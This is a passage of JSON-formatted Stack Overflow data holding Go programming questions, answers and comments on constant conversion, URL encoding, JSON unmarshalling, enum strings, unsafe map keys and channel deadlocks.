more details.</p>\n"}], "owner": {"reputation": 432, "user_id": 6340231, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-mHxBsfkZqiQ/AAAAAAAAAAI/AAAAAAAAAtU/ToLwyfBT1HM/photo.jpg?sz=128", "display_name": "Abhay Kumar", "link": "https://stackoverflow.com/users/6340231/abhay-kumar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 103, "favorite_count": 0, "accepted_answer_id": 52948394, "answer_count": 1, "score": 3, "last_activity_date": 1540302462, "creation_date": 1540290735, "last_edit_date": 1540302462, "question_id": 52946860, "link": "https://stackoverflow.com/questions/52946860/implicit-type-conversion-constant-vs-variables", "title": "Implicit type conversion constant vs variables", "body": "<p>I have faced a situation where I have some integer value in a <strong>constant</strong> and multiplying it with <strong>math.Pi</strong> constant as below:</p>\n\n<pre><code>func main() {\n    const a = 5\n    fmt.Printf(\"%v\", a*math.Pi)\n}\n</code></pre>\n\n<p>On execution it gives following result:</p>\n\n<pre><code>15.707963267948966\n</code></pre>\n\n<p>But, when I change the <strong>constant to variable (<code>variable a</code>)</strong> as below:</p>\n\n<pre><code>func main() {\n    a := 5\n    fmt.Printf(\"%v\", a*math.Pi)\n}\n</code></pre>\n\n<p>On compilation it gives the following error:</p>\n\n<pre><code>constant 3.14159 truncated to integer\n</code></pre>\n\n<p>As far as I understand implicit numeric type conversion is working when all operands of expression are constants, but not working when any of these a variable.</p>\n\n<p><strong>But why is this happening?</strong> </p>\n"}, {"tags": ["go"], "comments": [{"owner": {"reputation": 8884, "user_id": 5821354, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Qc8o0.jpg?s=128&g=1", "display_name": "Himanshu", "link": "https://stackoverflow.com/users/5821354/himanshu"}, "edited": false, "score": 0, "creation_date": 1540288766, "post_id": 52946196, "comment_id": 92800530, "body": "This is because you query contains spaces which are converted in %20 when coded."}, {"owner": {"reputation": 2942, "user_id": 477340, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/a858a54895a4242c16f7f43f92fd343d?s=128&d=identicon&r=PG", "display_name": "khinester", "link": "https://stackoverflow.com/users/477340/khinester"}, "reply_to_user": {"reputation": 8884, "user_id": 5821354, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Qc8o0.jpg?s=128&g=1", "display_name": "Himanshu", "link": "https://stackoverflow.com/users/5821354/himanshu"}, "edited": false, "score": 0, "creation_date": 1540289319, "post_id": 52946196, "comment_id": 92800874, "body": "if i use postman, to test my query, it converts it correctly, and the commas are also being changed to <code>%2C</code>"}, {"owner": {"reputation": 8884, "user_id": 5821354, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Qc8o0.jpg?s=128&g=1", "display_name": "Himanshu", "link": "https://stackoverflow.com/users/5821354/himanshu"}, "edited": false, "score": 0, "creation_date": 1540289480, "post_id": 52946196, "comment_id": 92800973, "body": "yes postman is smart enough to do that. You should pass your query inside url.Query"}, {"owner": {"reputation": 38307, "user_id": 2057388, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ceef8c04f66cd0e2bd360ef6abc14a81?s=128&d=identicon&r=PG", "display_name": "\u0417\u0435\u043b\u0451\u043d\u044b\u0439", "link": "https://stackoverflow.com/users/2057388/%d0%97%d0%b5%d0%bb%d1%91%d0%bd%d1%8b%d0%b9"}, "edited": false, "score": 0, "creation_date": 1540289555, "post_id": 52946196, "comment_id": 92801025, "body": "@khinesteryou should remove dupl <a href=\"https://stackoverflow.com/questions/52946228/golang-parsequery-url-gives-me-wrong-output\" title=\"golang parsequery url gives me wrong output\">stackoverflow.com/questions/52946228/&hellip;</a>"}, {"owner": {"reputation": 2942, "user_id": 477340, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/a858a54895a4242c16f7f43f92fd343d?s=128&d=identicon&r=PG", "display_name": "khinester", "link": "https://stackoverflow.com/users/477340/khinester"}, "edited": false, "score": 0, "creation_date": 1540289636, "post_id": 52946196, "comment_id": 92801079, "body": "yes, i already mentioned it on that post, not sure why this has happened"}, {"owner": {"reputation": 141, "user_id": 4143680, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-EZtiINlnyus/AAAAAAAAAAI/AAAAAAAABQc/se2NRS39sZw/photo.jpg?sz=128", "display_name": "Henry Henderson", "link": "https://stackoverflow.com/users/4143680/henry-henderson"}, "edited": false, "score": 1, "creation_date": 1540295360, "post_id": 52946196, "comment_id": 92804577, "body": "Just to give some little feedback: Go&#39;s standard library uses camel case over snake case or all caps const, etc. and is the recommended way to declare variables: <a href=\"https://golang.org/doc/effective_go.html#mixed-caps\" rel=\"nofollow noreferrer\">golang.org/doc/effective_go.html#mixed-caps</a>  Additionally, you may want to be using <code>main()</code> in your code instead of <code>init()</code> as that is primarily used to ensure initial states before program execution."}, {"owner": {"reputation": 2942, "user_id": 477340, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/a858a54895a4242c16f7f43f92fd343d?s=128&d=identicon&r=PG", "display_name": "khinester", "link": "https://stackoverflow.com/users/477340/khinester"}, "edited": false, "score": 0, "creation_date": 1540311498, "post_id": 52946196, "comment_id": 92815041, "body": "thank you for your advice"}], "answers": [{"tags": [], "owner": {"reputation": 8884, "user_id": 5821354, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Qc8o0.jpg?s=128&g=1", "display_name": "Himanshu", "link": "https://stackoverflow.com/users/5821354/himanshu"}, "is_accepted": true, "score": 2, "last_activity_date": 1540290328, "last_edit_date": 1540290328, "creation_date": 1540290115, "answer_id": 52946660, "question_id": 52946196, "link": "https://stackoverflow.com/questions/52946196/golang-parsequery-url-gives-me-wrong-output/52946660#52946660", "title": "golang ParseQuery url gives me wrong output", "body": "<p>Golang provide url package to manage this problem and pass the query string with key values to the browser and parse it accordingly after encoding the string which will resolve special characters issue:</p>\n\n<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"net/url\"\n)\n\nfunc main() {\n    query := make(url.Values)\n    query.Add(\"key\", \"value\")\n    url := &amp;url.URL{RawQuery: query.Encode(), Host: \"foo\", Scheme: \"http\"}\n    fmt.Println(url)\n}\n</code></pre>\n\n<p>Avoid using string query and adding values using fmt package Sprintf methods.This is not a proper way to manage query strings and creating a dynamic url.</p>\n"}], "owner": {"reputation": 2942, "user_id": 477340, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/a858a54895a4242c16f7f43f92fd343d?s=128&d=identicon&r=PG", "display_name": "khinester", "link": "https://stackoverflow.com/users/477340/khinester"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 494, "favorite_count": 0, "accepted_answer_id": 52946660, "answer_count": 1, "score": 2, "last_activity_date": 1540290328, "creation_date": 1540288577, "question_id": 52946196, "link": "https://stackoverflow.com/questions/52946196/golang-parsequery-url-gives-me-wrong-output", "title": "golang ParseQuery url gives me wrong output", "body": "<p>I have the following code:</p>\n\n<pre><code>func init() {\n    today := time.Now()\n\n    // If ENDPOINT is empty, It'll use this hardcoded endpoint. The ENDPOINT variable should not contain any text after \"ModifiedDate gt\". The actual date is currentDay-1\n    if ENDPOINT == \"\" {\n        ENDPOINT = \"http://localhost:8000/Contacts/Export/?$select=Firstname,Lastname,Email,SubaccountId&amp;$filter=EEA eq '' and ModifiedDate gt\"\n    }\n\n    // Append CurrentDay-1 in YYY`enter code here`Y-MM-DDTHH:MM:SSZ format.\n    // The time is NOT in UTC. It's the local time of the machine on which lambda function was running\n    ENDPOINT = fmt.Sprintf(\"%s %s\", ENDPOINT, today.AddDate(0, 0, -1).Format(\"2006-01-02T15:04:05Z\"))\n\n    var err error\n    // parse the url\n    PARSED_ENDPOINT, err = url.Parse(ENDPOINT)\n    if err != nil {\n        log.Fatalln(\"Invalid $ENDPOINT\", err)\n    }\n\n    // parse the query parameters\n    parsedQueryParams, err := url.ParseQuery(PARSED_ENDPOINT.RawQuery)\n    if err != nil {\n        log.Fatalln(\"error in parsing query parameters\", err)\n    }\n\n    // URLEncode query parameters\n    PARSED_ENDPOINT.RawQuery = parsedQueryParams.Encode()\n}\n</code></pre>\n\n<p>When I output the URL, I get:</p>\n\n<pre><code>'http://localhost:8000/Contacts/Export/?%24filter=EEA+eq+%27%27+and+ModifiedDate+gt+2018-10-22T08%3A45%3A45Z&amp;%24select=Email%2CFirstname%2CLastname%2CSubaccountId%2CEEA'\n</code></pre>\n\n<p>How do I return:</p>\n\n<pre><code>'http://localhost:8000/Contacts/Export/?$filter=EEA%20eq%20%27%27%20and%20ModifiedDate%20gt%202018-10-22T00:00:00Z&amp;$select=Email,Firstname,Lastname,SubaccountId,EEA'\n</code></pre>\n\n<p>Any advice is much appreciated</p>\n"}, {"tags": ["json", "go"], "comments": [{"owner": {"reputation": 8884, "user_id": 5821354, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Qc8o0.jpg?s=128&g=1", "display_name": "Himanshu", "link": "https://stackoverflow.com/users/5821354/himanshu"}, "edited": false, "score": 0, "creation_date": 1540286694, "post_id": 52945508, "comment_id": 92799096, "body": "The solution is to use interface and then fetch the value from there. What you are asking is not possible in golang."}, {"owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "edited": false, "score": 0, "creation_date": 1540293677, "post_id": 52945508, "comment_id": 92803546, "body": "Nothing has a default UnmarshalJSON method. Please provide a real example."}], "answers": [{"tags": [], "owner": {"reputation": 8884, "user_id": 5821354, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Qc8o0.jpg?s=128&g=1", "display_name": "Himanshu", "link": "https://stackoverflow.com/users/5821354/himanshu"}, "is_accepted": true, "score": 0, "last_activity_date": 1540287580, "last_edit_date": 1540287580, "creation_date": 1540286883, "answer_id": 52945619, "question_id": 52945508, "link": "https://stackoverflow.com/questions/52945508/execute-self-unmarshal-method-or-default-unmarshal-method-base-on-condition-in-g/52945619#52945619", "title": "execute self unmarshal method or default unmarshal method base on condition in golang", "body": "<p>Use an interface whatever be the format you are getting from the json response and unmarshal the response into interface as:</p>\n\n<pre><code>func main(){\n    var result interface{}\n    if err := json.Unmarshal(jsonbytes, &amp;result); err != nil{\n         fmt.Println(err)\n    }\n}\n</code></pre>\n\n<p>Then use type assertion to fetch the value underlying the interface. But I think in your case if you do not the underlying type of a key. Better is to use recursion to fetch the value.</p>\n\n<pre><code>func fetchValue(value interface{}) {\n    switch value.(type) {\n    case string:\n        fmt.Printf(\"%v is an interface \\n \", value)\n    case bool:\n        fmt.Printf(\"%v is bool \\n \", value)\n    case float64:\n        fmt.Printf(\"%v is float64 \\n \", value)\n    case []interface{}:\n        fmt.Printf(\"%v is a slice of interface \\n \", value)\n        for _, v := range value.([]interface{}) { // use type assertion to loop over []interface{}\n            fetchValue(v)\n        }\n    case map[string]interface{}:\n        fmt.Printf(\"%v is a map \\n \", value)\n        for _, v := range value.(map[string]interface{}) { // use type assertion to loop over map[string]interface{}\n            fetchValue(v)\n        }\n    default:\n        fmt.Printf(\"%v is unknown \\n \", value)\n    }\n}\n</code></pre>\n\n<p>Working Code on <a href=\"https://play.golang.org/p/-eZW1L89Lbu\" rel=\"nofollow noreferrer\">Go playground</a></p>\n\n<p>Above code will let you to fetch any type of value that is parsed into an interface. </p>\n\n<p><strong>Note:</strong></p>\n\n<blockquote>\n  <p>In golang it is defined that when you unmarshal unknown json into an\n  interface. It will be converted into following types:</p>\n</blockquote>\n\n<pre><code>bool, for JSON booleans\nfloat64, for JSON numbers\nstring, for JSON strings\n[]interface{}, for JSON arrays // slice of interface{}\nmap[string]interface{}, for JSON objects\nnil for JSON null\n</code></pre>\n"}], "owner": {"reputation": 1887, "user_id": 6514989, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/7cc849ff19574490024b6e12ef33c82b?s=128&d=identicon&r=PG&f=1", "display_name": "nail fei", "link": "https://stackoverflow.com/users/6514989/nail-fei"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 115, "favorite_count": 0, "accepted_answer_id": 52945619, "answer_count": 1, "score": 0, "last_activity_date": 1540287580, "creation_date": 1540286552, "question_id": 52945508, "link": "https://stackoverflow.com/questions/52945508/execute-self-unmarshal-method-or-default-unmarshal-method-base-on-condition-in-g", "title": "execute self unmarshal method or default unmarshal method base on condition in golang", "body": "<p>I am a novice in golang. I have a struct <strong>Item</strong> .</p>\n\n<pre><code>type Item Struct{\n   ...\n}\n</code></pre>\n\n<p>and I know it has a default <strong>UnmarshalJSON</strong> method.<br>\nNow I want to unmarshal data to it.</p>\n\n<p>For the data may has <strong>two different</strong> format. So my expection as below:</p>\n\n<pre><code>if condition {\n    //execute default UnmarshalJSON\n    json.Unmarshal(data, &amp;item) \n}else{\n    //execute my own UnmarshalJSON\n    json.Unmarshal(data, &amp;item) \n}\n</code></pre>\n\n<p>this is my own UnmarshalJSON.</p>\n\n<pre><code>func (item *Item) UnmarshalJSON(data []byte) error{\n   ...\n}\n</code></pre>\n\n<p>Maybe myself UnmarshalJSON will override default, so the two method could not be present at the same time. I want to know how to solve this kind problem which Unmarshal two different format data into one struct.</p>\n"}, {"tags": ["go"], "comments": [{"owner": {"reputation": 3542, "user_id": 5033611, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47a91063fb01317639d57d5fc9c9d9c7?s=128&d=identicon&r=PG", "display_name": "ssemilla", "link": "https://stackoverflow.com/users/5033611/ssemilla"}, "edited": false, "score": 1, "creation_date": 1540284582, "post_id": 52944767, "comment_id": 92797749, "body": "Check this out: <a href=\"https://blog.golang.org/generate\" rel=\"nofollow noreferrer\">blog.golang.org/generate</a> It may be more apt for your use case."}, {"owner": {"reputation": 60130, "user_id": 13860, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/6bdc06836b7bcec9fce2c5c6e5242192?s=128&d=identicon&r=PG", "display_name": "Flimzy", "link": "https://stackoverflow.com/users/13860/flimzy"}, "edited": false, "score": 0, "creation_date": 1540286121, "post_id": 52944767, "comment_id": 92798695, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/14426366/what-is-an-idiomatic-way-of-representing-enums-in-go\">What is an idiomatic way of representing enums in Go?</a>"}], "answers": [{"comments": [{"owner": {"reputation": 2886, "user_id": 2219213, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/BW004.jpg?s=128&g=1", "display_name": "Sergii Getman", "link": "https://stackoverflow.com/users/2219213/sergii-getman"}, "edited": false, "score": 0, "creation_date": 1540285348, "post_id": 52944822, "comment_id": 92798252, "body": "Thanks, Grzegorz \u017bur. I follow that way. But there is another point of view: if we don&#39;t change type state  - better to declare function."}, {"owner": {"reputation": 41009, "user_id": 450989, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YGjdr.jpg?s=128&g=1", "display_name": "Grzegorz \u017bur", "link": "https://stackoverflow.com/users/450989/grzegorz-%c5%bbur"}, "reply_to_user": {"reputation": 2886, "user_id": 2219213, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/BW004.jpg?s=128&g=1", "display_name": "Sergii Getman", "link": "https://stackoverflow.com/users/2219213/sergii-getman"}, "edited": false, "score": 0, "creation_date": 1540286268, "post_id": 52944822, "comment_id": 92798796, "body": "@SergiiGetman Could explain this part better &quot;we don&#39;t change type state&quot;?"}, {"owner": {"reputation": 2886, "user_id": 2219213, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/BW004.jpg?s=128&g=1", "display_name": "Sergii Getman", "link": "https://stackoverflow.com/users/2219213/sergii-getman"}, "edited": false, "score": 0, "creation_date": 1540287129, "post_id": 52944822, "comment_id": 92799394, "body": "Grzegorz \u017bur. I ma newbie in go and can be wrong. But idea is if we have type, for example <code>struct</code>. and we have some piece of code that change that struct it is better to make it method of that type. if we just <code>use</code> the type we can make fucntion"}, {"owner": {"reputation": 41009, "user_id": 450989, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YGjdr.jpg?s=128&g=1", "display_name": "Grzegorz \u017bur", "link": "https://stackoverflow.com/users/450989/grzegorz-%c5%bbur"}, "reply_to_user": {"reputation": 2886, "user_id": 2219213, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/BW004.jpg?s=128&g=1", "display_name": "Sergii Getman", "link": "https://stackoverflow.com/users/2219213/sergii-getman"}, "edited": false, "score": 0, "creation_date": 1540287966, "post_id": 52944822, "comment_id": 92799987, "body": "Please see <a href=\"https://golang.org/doc/faq#methods_on_values_or_pointers\" rel=\"nofollow noreferrer\">Should I define methods on values or pointers?</a>"}], "tags": [], "owner": {"reputation": 41009, "user_id": 450989, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YGjdr.jpg?s=128&g=1", "display_name": "Grzegorz \u017bur", "link": "https://stackoverflow.com/users/450989/grzegorz-%c5%bbur"}, "is_accepted": true, "score": 9, "last_activity_date": 1540286363, "last_edit_date": 1540286363, "creation_date": 1540284398, "answer_id": 52944822, "question_id": 52944767, "link": "https://stackoverflow.com/questions/52944767/what-is-idiomatic-way-to-get-string-representation-of-enum-in-go/52944822#52944822", "title": "What is idiomatic way to get string representation of enum in Go?", "body": "<p>The second one is more idiomatic because it satisfies <a href=\"https://golang.org/pkg/fmt/#Stringer\" rel=\"nofollow noreferrer\">Stringer</a> interface.</p>\n\n<pre><code>func (day Day) String() string  {\n    ... \n}\n</code></pre>\n\n<p>We declare this method on the <code>Day</code> type not <code>*Day</code> type because we are not changing the value.</p>\n\n<p>It will enable you to write.</p>\n\n<pre><code>fmt.Println(day)\n</code></pre>\n\n<p>and get the value produced by <code>String</code> method.</p>\n"}, {"tags": [], "owner": {"reputation": 133115, "user_id": 221700, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ad32856042eea9fd2db5210ac033787d?s=128&d=identicon&r=PG", "display_name": "peterSO", "link": "https://stackoverflow.com/users/221700/peterso"}, "is_accepted": false, "score": 4, "last_activity_date": 1540289350, "last_edit_date": 1540289350, "creation_date": 1540288870, "answer_id": 52946272, "question_id": 52944767, "link": "https://stackoverflow.com/questions/52944767/what-is-idiomatic-way-to-get-string-representation-of-enum-in-go/52946272#52946272", "title": "What is idiomatic way to get string representation of enum in Go?", "body": "<p>The easy way for you to answer this question yourself is to look at the Go standard library.</p>\n\n<hr>\n\n<blockquote>\n  <p><a href=\"https://golang.org/pkg/time/\" rel=\"nofollow noreferrer\">Package time</a></p>\n\n<pre><code>import \"time\" \n</code></pre>\n  \n  <p><a href=\"https://golang.org/pkg/time/#Weekday\" rel=\"nofollow noreferrer\">type Weekday</a></p>\n  \n  <p>A Weekday specifies a day of the week (Sunday = 0, ...).</p>\n\n<pre><code>type Weekday int\n\nconst (\n        Sunday Weekday = iota\n        Monday\n        Tuesday\n        Wednesday\n        Thursday\n        Friday\n        Saturday\n)\n</code></pre>\n  \n  <p>func (Weekday) String</p>\n\n<pre><code>func (d Weekday) String() string\n</code></pre>\n  \n  <p>String returns the English name of the day (\"Sunday\", \"Monday\", ...).</p>\n</blockquote>\n\n<p><code>src/time/time.go</code>:</p>\n\n<pre><code>// A Weekday specifies a day of the week (Sunday = 0, ...).\n\ntype Weekday int\n\nconst (\n    Sunday Weekday = iota\n    Monday\n    Tuesday\n    Wednesday\n    Thursday\n    Friday\n    Saturday\n)\n\nvar days = [...]string{\n    \"Sunday\",\n    \"Monday\",\n    \"Tuesday\",\n    \"Wednesday\",\n    \"Thursday\",\n    \"Friday\",\n    \"Saturday\",\n}\n\n// String returns the English name of the day (\"Sunday\", \"Monday\", ...).\nfunc (d Weekday) String() string {\n    if Sunday &lt;= d &amp;&amp; d &lt;= Saturday {\n        return days[d]\n    }\n    buf := make([]byte, 20)\n    n := fmtInt(buf, uint64(d))\n    return \"%!Weekday(\" + string(buf[n:]) + \")\"\n}\n</code></pre>\n\n<hr>\n\n<blockquote>\n  <p><a href=\"https://golang.org/pkg/fmt/\" rel=\"nofollow noreferrer\">Package fmt</a></p>\n\n<pre><code>import \"fmt\" \n</code></pre>\n  \n  <p><a href=\"https://golang.org/pkg/fmt/#Stringer\" rel=\"nofollow noreferrer\">type Stringer</a></p>\n  \n  <p>Stringer is implemented by any value that has a String method, which\n  defines the \u201cnative\u201d format for that value. The String method is used\n  to print values passed as an operand to any format that accepts a\n  string or to an unformatted printer such as Print.</p>\n\n<pre><code>type Stringer interface {\n        String() string\n}\n</code></pre>\n</blockquote>\n"}], "owner": {"reputation": 2886, "user_id": 2219213, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/BW004.jpg?s=128&g=1", "display_name": "Sergii Getman", "link": "https://stackoverflow.com/users/2219213/sergii-getman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1090, "favorite_count": 1, "accepted_answer_id": 52944822, "answer_count": 2, "score": 3, "last_activity_date": 1540289850, "creation_date": 1540284215, "last_edit_date": 1540289850, "question_id": 52944767, "link": "https://stackoverflow.com/questions/52944767/what-is-idiomatic-way-to-get-string-representation-of-enum-in-go", "title": "What is idiomatic way to get string representation of enum in Go?", "body": "<p>If I have an enum:</p>\n\n<pre><code>type Day int8\n\nconst (\n    Monday Day = iota\n    Tuesday\n    ...\n    Sunday\n)\n</code></pre>\n\n<p>What is more <em>natural</em> <em>Go</em> way to get string of it?</p>\n\n<p>fucntion:</p>\n\n<pre><code>func ToString(day Day) string {\n   ...\n}\n</code></pre>\n\n<p>or method</p>\n\n<pre><code>func (day Day) String() string  {\n    ... \n}\n</code></pre>\n"}, {"tags": ["go"], "comments": [{"owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "edited": false, "score": 3, "creation_date": 1540283291, "post_id": 52944378, "comment_id": 92796898, "body": "Rule of thumb: Never use package unsafe. Especially if you are not proficient in the language. What you are trying to do is explicitly <i>forbidden</i> by the language. Whatever abomination you are trying to do: Don&#39;t."}, {"owner": {"reputation": 3542, "user_id": 5033611, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47a91063fb01317639d57d5fc9c9d9c7?s=128&d=identicon&r=PG", "display_name": "ssemilla", "link": "https://stackoverflow.com/users/5033611/ssemilla"}, "reply_to_user": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "edited": false, "score": 2, "creation_date": 1540284257, "post_id": 52944378, "comment_id": 92797534, "body": "@Volker is right, strings are immutable in Go and circumventing this limitation using <code>unsafe</code> is highly discouraged. From the looks of your code, you are aware that strings are just a pair of a pointer and length. Since you are pointing to the same memory location, you are using the same key - <code>byteKey</code> - for everything. That is why, you are seeing &quot;c&quot; - your last update -as the key for all."}, {"owner": {"reputation": 152, "user_id": 4438849, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4b0bf9fca9321e872f166c4205b8437d?s=128&d=identicon&r=PG&f=1", "display_name": "qRoC", "link": "https://stackoverflow.com/users/4438849/qroc"}, "edited": false, "score": 0, "creation_date": 1540285063, "post_id": 52944378, "comment_id": 92798054, "body": "So hash of key based on address?"}], "answers": [{"tags": [], "owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "is_accepted": false, "score": 2, "last_activity_date": 1540283444, "creation_date": 1540283444, "answer_id": 52944534, "question_id": 52944378, "link": "https://stackoverflow.com/questions/52944378/how-use-one-byte-buffer-as-key-storage-for-map/52944534#52944534", "title": "How use one byte buffer as key storage for map?", "body": "<blockquote>\n  <p>How use [a] ... byte [slice] ... as key ... for map?</p>\n</blockquote>\n\n<p>You cannot. The language forbids slices as map keys as the content of a slice may change underhand (which is a property no map key must have).</p>\n"}], "owner": {"reputation": 152, "user_id": 4438849, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4b0bf9fca9321e872f166c4205b8437d?s=128&d=identicon&r=PG&f=1", "display_name": "qRoC", "link": "https://stackoverflow.com/users/4438849/qroc"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 53, "favorite_count": 0, "answer_count": 1, "score": -5, "last_activity_date": 1540283444, "creation_date": 1540283046, "question_id": 52944378, "link": "https://stackoverflow.com/questions/52944378/how-use-one-byte-buffer-as-key-storage-for-map", "title": "How use one byte buffer as key storage for map?", "body": "<p>How use one byte buffer as key storage for map without copy?</p>\n\n<pre><code>func TestMap(t *testing.T) {\n    testMap := make(map[string]int)\n\n    //byteKey := make([]byte, 2)\n    //byteKey[0] = 0\n    byteKey := make([]byte, 1)\n\n    {\n        byteKey[0] = 'a'\n        key := BytesToString(byteKey)\n        testMap[key] += 1\n    }\n\n    {\n        byteKey[0] = 'b'\n        key := BytesToString(byteKey)\n        testMap[key] += 1\n    }\n\n    {\n        byteKey[0] = 'c'\n        key := BytesToString(byteKey)\n        testMap[key] += 1\n    }\n\n    for key, _ := range testMap {\n        println(key, testMap[key])\n    }\n}\n</code></pre>\n\n<p>If <code>BytesToString</code> is just string cast ( string(buffer) ), that method print:</p>\n\n<blockquote>\n  <p>a 1\n  b 1\n  c 1</p>\n</blockquote>\n\n<p>but if <code>BytesToString</code> has content:</p>\n\n<pre><code>func BytesToString(b []byte) string {\n    bytesHeader := (*reflect.SliceHeader)(unsafe.Pointer(&amp;b))\n    strHeader := reflect.StringHeader{Data: bytesHeader.Data, Len: bytesHeader.Len}\n    return *(*string)(unsafe.Pointer(&amp;strHeader))\n}\n</code></pre>\n\n<p>Result of function:</p>\n\n<blockquote>\n  <p>c 1\n  c 1\n  c 1</p>\n</blockquote>\n"}, {"tags": ["go", "channel", "goroutine"], "answers": [{"comments": [{"owner": {"reputation": 98839, "user_id": 3848, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/W10YY.jpg?s=128&g=1", "display_name": "Motti", "link": "https://stackoverflow.com/users/3848/motti"}, "edited": false, "score": 1, "creation_date": 1540285407, "post_id": 52943892, "comment_id": 92798289, "body": "I remove the goroutine in <code>sq</code> which was what was actually asked about (your answer still solves the problem). Please re-edit if I changed your intent."}, {"owner": {"reputation": 8884, "user_id": 5821354, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Qc8o0.jpg?s=128&g=1", "display_name": "Himanshu", "link": "https://stackoverflow.com/users/5821354/himanshu"}, "edited": false, "score": 0, "creation_date": 1540286214, "post_id": 52943892, "comment_id": 92798755, "body": "This does not provide my answer. My question was why we are not getting deadlock on wrapping the inbound channels inside go routine. This has nothing to do with the buffer. In buffered channels the channel will add the data to the buffer when receiver is not available."}, {"owner": {"reputation": 101, "user_id": 10441175, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-kRVCauU-iC4/AAAAAAAAAAI/AAAAAAAAAOQ/8tSn6FbPoQA/photo.jpg?sz=128", "display_name": "iHelos", "link": "https://stackoverflow.com/users/10441175/ihelos"}, "edited": false, "score": 0, "creation_date": 1540394785, "post_id": 52943892, "comment_id": 92851822, "body": "it&#39;s all about different flows of sync and async programms. in case of &#39;go&#39; keyword usage the program can transfer control of program execution to another goroutine, so buffer can be freed.  <code>Sync:</code> <code>1) Write to channel</code> <code>2) Write to channel - blocked</code> and the async usage can be like <code>Async:</code> <code>1) Write to channel</code> <code>2) Read from channel</code> <code>3) Write to channel</code> <code>4) Read from channel</code>"}], "tags": [], "owner": {"reputation": 101, "user_id": 10441175, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-kRVCauU-iC4/AAAAAAAAAAI/AAAAAAAAAOQ/8tSn6FbPoQA/photo.jpg?sz=128", "display_name": "iHelos", "link": "https://stackoverflow.com/users/10441175/ihelos"}, "is_accepted": false, "score": 2, "last_activity_date": 1540285048, "last_edit_date": 1540285048, "creation_date": 1540281355, "answer_id": 52943892, "question_id": 52943450, "link": "https://stackoverflow.com/questions/52943450/go-routine-for-range-over-channels/52943892#52943892", "title": "go routine for range over channels", "body": "<p>This situation caused of output channel of <code>sq</code> function is not buffered. So <code>sq</code> is waiting until next function will read from output, but if <code>sq</code> is not async, it will not happen (<a href=\"https://play.golang.org/p/enUHineH7QX\" rel=\"nofollow noreferrer\">Playground link</a>):</p>\n\n<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"sync\"\n)\n\nvar wg sync.WaitGroup\n\nfunc main() {\n    numsCh := gen(3, 4)\n    sqCh := sq(numsCh) // if there is no sq in body - we are locked here until input channel will be closed\n    result := sq(sqCh) // but if output channel is not buffered, so `sq` is locked, until next function will read from output channel\n\n    for n := range result {\n        fmt.Println(n)\n    }\n    fmt.Println(\"Process completed\")\n}\n\nfunc gen(nums ...int) &lt;-chan int {\n    out := make(chan int)\n    go func() {\n        for _, n := range nums {\n            out &lt;- n\n        }\n        close(out)\n    }()\n    return out\n}\n\nfunc sq(in &lt;-chan int) &lt;-chan int {\n    out := make(chan int, 100)\n    for n := range in {\n        out &lt;- n * n\n    }\n    close(out)\n    return out\n}\n</code></pre>\n"}, {"comments": [{"owner": 